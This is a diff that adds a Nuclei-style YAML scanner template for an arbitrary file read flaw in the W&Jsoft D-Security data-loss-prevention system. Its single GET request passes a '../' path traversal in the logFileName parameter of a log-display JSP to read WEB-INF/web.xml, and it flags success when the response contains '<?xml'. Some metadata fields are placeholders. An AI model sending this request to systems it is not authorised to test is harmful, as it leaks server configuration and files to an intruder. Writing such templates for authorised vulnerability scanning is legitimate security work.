@@ -1,0 +1,19 @@
+id: WJsoft-D-Security-DLP-lfi
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: W&Jsoft-D-Security数据仿泄露系统(DLP)存在任意文件读取漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
